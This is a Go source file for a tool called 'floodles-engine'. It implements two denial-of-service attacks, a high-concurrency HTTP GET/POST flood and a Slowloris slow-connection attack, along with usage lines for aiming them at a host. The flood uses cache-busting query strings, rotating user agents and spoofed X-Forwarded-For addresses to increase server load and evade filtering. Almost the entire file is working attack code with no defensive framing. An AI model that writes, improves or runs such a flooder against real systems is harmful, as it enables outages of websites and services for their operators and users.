// native/go/engine.go
// Go flood engine: goroutine-based HTTP flood + generic worker pool.
//
// Why Go here:
//   - Goroutines: 2KB stack vs 8MB OS thread -> 100k+ concurrent easily
//   - net/http: production-grade HTTP client, connection pooling built-in
//   - scheduler: M:N threading, goroutines multiplexed over OS threads
//   - channels: clean rate limiting and stop signaling
//   - No GIL: true parallelism on all cores
//
// Build:
//   go build -o floodles-engine -ldflags="-s -w" .
//
// Usage standalone:
//   ./floodles-engine http --url http://192.168.1.100/search --concurrency 5000 --duration 60
//   ./floodles-engine slow --host 192.168.1.100 --port 80 --sockets 500 --duration 120
//
// Usage from Python:
//   proc = subprocess.Popen(["./floodles-engine", "http", "--url", url, ...])

package main

import (
	"crypto/tls"
	"flag"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"os"
	"os/signal"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
)

// ============================================================================
// Shared metrics
// ============================================================================

type Metrics struct {
	requests  atomic.Int64
	ok        atomic.Int64
	errors    atomic.Int64
	timeouts  atomic.Int64
	startTime time.Time
}

func (m *Metrics) RPS() float64 {
	elapsed := time.Since(m.startTime).Seconds()
	if elapsed <= 0 {
		return 0
	}
	return float64(m.requests.Load()) / elapsed
}

func (m *Metrics) Print() {
	fmt.Printf(
		"\r  reqs=%-10d  ok=%-8d  err=%-6d  timeout=%-6d  rps=%-8.1f",
		m.requests.Load(), m.ok.Load(), m.errors.Load(),
		m.timeouts.Load(), m.RPS(),
	)
}

// ============================================================================
// HTTP Flood
// ============================================================================

var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0.0.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3) AppleWebKit/605.1.15 Safari/17.3",
	"Mozilla/5.0 (X11; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) Mobile/15E148 Safari/604.1",
	"curl/8.6.0",
}

func randomUA() string {
	return userAgents[rand.Intn(len(userAgents))]
}

func cacheBust(url string) string {
	sep := "?"
	for _, c := range url {
		if c == '?' {
			sep = "&"
			break
		}
	}
	return fmt.Sprintf("%s%s_=%d", url, sep, rand.Int63())
}

func httpWorker(
	url string,
	method string,
	bust bool,
	postSize int,
	client *http.Client,
	metrics *Metrics,
	stop <-chan struct{},
	wg *sync.WaitGroup,
) {
	defer wg.Done()

	buf := make([]byte, postSize)
	rand.Read(buf)

	for {
		select {
		case <-stop:
			return
		default:
		}

		target := url
		if bust {
			target = cacheBust(url)
		}

		var req *http.Request
		var err error

		if method == "POST" {
			req, err = http.NewRequest("POST", target,
				io.NopCloser(newRandReader(postSize)))
			if err == nil {
				req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
				req.ContentLength = int64(postSize)
			}
		} else {
			req, err = http.NewRequest("GET", target, nil)
		}

		if err != nil {
			metrics.errors.Add(1)
			metrics.requests.Add(1)
			continue
		}

		req.Header.Set("User-Agent", randomUA())
		req.Header.Set("Accept", "*/*")
		req.Header.Set("Cache-Control", "no-cache")
		req.Header.Set("X-Forwarded-For", randIP())

		resp, err := client.Do(req)
		metrics.requests.Add(1)

		if err != nil {
			if isTimeout(err) {
				metrics.timeouts.Add(1)
			} else {
				metrics.errors.Add(1)
			}
			continue
		}

		io.Copy(io.Discard, resp.Body)
		resp.Body.Close()

		if resp.StatusCode < 400 {
			metrics.ok.Add(1)
		} else {
			metrics.errors.Add(1)
		}
	}
}

func runHTTP(url, method string, concurrency, duration, postSize int, bust bool) {
	transport := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		MaxIdleConns:    concurrency,
		MaxConnsPerHost: concurrency,
		IdleConnTimeout: 90 * time.Second,
		// Disable keep-alive to avoid reusing connections (more server load)
		DisableKeepAlives: false,
	}

	client := &http.Client{
		Transport: transport,
		Timeout:   5 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse // Don't follow redirects
		},
	}

	metrics := &Metrics{startTime: time.Now()}
	stop := make(chan struct{})
	var wg sync.WaitGroup

	fmt.Printf("[*] HTTP %s flood -> %s  concurrency=%d  duration=%ds\n",
		method, url, concurrency, duration)

	for i := 0; i < concurrency; i++ {
		wg.Add(1)
		go httpWorker(url, method, bust, postSize, client, metrics, stop, &wg)
	}

	// Ticker for live display
	ticker := time.NewTicker(time.Second)
	defer ticker.Stop()

	// Signal handler
	sig := make(chan os.Signal, 1)
	signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM)

	var timer <-chan time.Time
	if duration > 0 {
		timer = time.After(time.Duration(duration) * time.Second)
	}

	for {
		select {
		case <-ticker.C:
			metrics.Print()
		case <-sig:
			fmt.Println("\n[*] Interrupted.")
			goto done
		case <-timer:
			goto done
		}
	}

done:
	close(stop)
	wg.Wait()
	fmt.Printf("\n[+] Done. requests=%d ok=%d errors=%d timeouts=%d rps=%.1f\n",
		metrics.requests.Load(), metrics.ok.Load(),
		metrics.errors.Load(), metrics.timeouts.Load(), metrics.RPS())
}

// ============================================================================
// Slowloris engine
// ============================================================================

func slowlorisWorker(
	host string,
	port int,
	useTLS bool,
	interval time.Duration,
	metrics *Metrics,
	stop <-chan struct{},
	wg *sync.WaitGroup,
) {
	defer wg.Done()

	for {
		select {
		case <-stop:
			return
		default:
		}

		conn, err := dialTarget(host, port, useTLS)
		if err != nil {
			metrics.errors.Add(1)
			time.Sleep(100 * time.Millisecond)
			continue
		}

		// Send partial HTTP GET (no final \r\n\r\n)
		partial := fmt.Sprintf(
			"GET /?%d HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nAccept-Language: en-US\r\n",
			rand.Int63(), host, randomUA(),
		)
		conn.Write([]byte(partial))
		metrics.ok.Add(1)
		metrics.requests.Add(1)

		// Keep connection alive with junk headers
		for {
			select {
			case <-stop:
				conn.Close()
				return
			case <-time.After(interval + time.Duration(rand.Intn(2000))*time.Millisecond):
				header := fmt.Sprintf("X-Custom-%d: %s\r\n",
					rand.Intn(9999), randStr(16))
				_, err := conn.Write([]byte(header))
				if err != nil {
					goto reconnect
				}
			}
		}
	reconnect:
		conn.Close()
	}
}

func runSloworis(host string, port, sockets, duration int, useTLS bool) {
	metrics := &Metrics{startTime: time.Now()}
	stop := make(chan struct{})
	var wg sync.WaitGroup

	fmt.Printf("[*] Slowloris -> %s:%d  sockets=%d  duration=%ds  tls=%v\n",
		host, port, sockets, duration, useTLS)

	interval := 10 * time.Second

	for i := 0; i < sockets; i++ {
		wg.Add(1)
		go slowlorisWorker(host, port, useTLS, interval, metrics, stop, &wg)
		// Stagger creation to avoid SYN burst
		time.Sleep(time.Duration(rand.Intn(20)) * time.Millisecond)
	}

	ticker := time.NewTicker(time.Second)
	defer ticker.Stop()

	sig := make(chan os.Signal, 1)
	signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM)

	var timer <-chan time.Time
	if duration > 0 {
		timer = time.After(time.Duration(duration) * time.Second)
	}

	for {
		select {
		case <-ticker.C:
			fmt.Printf("\r  sockets_active=%d  errors=%d  elapsed=%.0fs",
				metrics.ok.Load(), metrics.errors.Load(),
				time.Since(metrics.startTime).Seconds())
		case <-sig:
			fmt.Println("\n[*] Interrupted.")
			goto done
		case <-timer:
			goto done
		}
	}
done:
	close(stop)
	wg.Wait()
	fmt.Printf("\n[+] Done. active_sockets=%d errors=%d\n",
		metrics.ok.Load(), metrics.errors.Load())
}

// ============================================================================
// Helpers
// ============================================================================

func dialTarget(host string, port int, useTLS bool) (net.Conn, error) {
	addr := fmt.Sprintf("%s:%d", host, port)
	if useTLS {
		return tls.Dial("tcp", addr, &tls.Config{InsecureSkipVerify: true})
	}
	return net.DialTimeout("tcp", addr, 5*time.Second)
}

func randIP() string {
	return fmt.Sprintf("%d.%d.%d.%d",
		rand.Intn(223)+1, rand.Intn(255),
		rand.Intn(255), rand.Intn(254)+1)
}

func randStr(n int) string {
	const chars = "abcdefghijklmnopqrstuvwxyz0123456789"
	b := make([]byte, n)
	for i := range b {
		b[i] = chars[rand.Intn(len(chars))]
	}
	return string(b)
}

func isTimeout(err error) bool {
	if netErr, ok := err.(net.Error); ok {
		return netErr.Timeout()
	}
	return false
}

// Random reader for POST body (avoids allocation of full buffer)
type randReader struct{ remaining int }

func newRandReader(n int) *randReader { return &randReader{n} }

func (r *randReader) Read(p []byte) (n int, err error) {
	if r.remaining <= 0 {
		return 0, io.EOF
	}
	n = len(p)
	if n > r.remaining {
		n = r.remaining
	}
	rand.Read(p[:n])
	r.remaining -= n
	return n, nil
}

// ============================================================================
// Main - CLI dispatcher
// ============================================================================

func main() {
	if len(os.Args) < 2 {
		fmt.Fprintln(os.Stderr, "usage: floodles-engine <http|slow> [options]")
		os.Exit(1)
	}

	switch os.Args[1] {

	case "http":
		fs := flag.NewFlagSet("http", flag.ExitOnError)
		url         := fs.String("url", "", "Target URL (required)")
		method      := fs.String("method", "GET", "HTTP method: GET or POST")
		concurrency := fs.Int("concurrency", 1000, "Goroutine count")
		duration    := fs.Int("duration", 30, "Duration in seconds")
		postSize    := fs.Int("post-size", 1024, "POST body size in bytes")
		noBust      := fs.Bool("no-bust", false, "Disable cache busting")
		fs.Parse(os.Args[2:])

		if *url == "" {
			fmt.Fprintln(os.Stderr, "[!] --url required")
			os.Exit(1)
		}
		runHTTP(*url, *method, *concurrency, *duration, *postSize, !*noBust)

	case "slow":
		fs := flag.NewFlagSet("slow", flag.ExitOnError)
		host     := fs.String("host", "", "Target host (required)")
		port     := fs.Int("port", 80, "Target port")
		sockets  := fs.Int("sockets", 500, "Concurrent slow sockets")
		duration := fs.Int("duration", 60, "Duration in seconds")
		useTLS   := fs.Bool("tls", false, "Use TLS")
		fs.Parse(os.Args[2:])

		if *host == "" {
			fmt.Fprintln(os.Stderr, "[!] --host required")
			os.Exit(1)
		}
		runSloworis(*host, *port, *sockets, *duration, *useTLS)

	default:
		fmt.Fprintf(os.Stderr, "[!] Unknown command: %s\n", os.Args[1])
		os.Exit(1)
	}
}
